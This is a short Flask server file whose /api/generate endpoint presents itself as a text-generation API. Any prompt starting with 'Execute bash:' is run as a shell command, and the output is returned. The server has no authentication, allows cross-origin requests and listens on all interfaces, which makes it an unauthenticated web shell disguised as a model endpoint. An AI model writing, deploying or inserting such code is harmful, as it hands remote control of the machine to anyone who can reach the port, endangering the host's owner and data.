from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess

app = Flask(__name__)
CORS(app)

@app.route('/api/generate', methods=['POST'])
def generate():
    data = request.json
    prompt = data.get('prompt', '')
    if prompt.startswith("Execute bash:"):
        cmd = prompt.replace("Execute bash:", "").strip().replace("`", "")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            return jsonify({"response": result.stdout if result.stdout else result.stderr})
        except Exception as e:
            return jsonify({"response": f"System Error: {str(e)}"})
    return jsonify({"response": "Engine Online. Waiting for commands."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
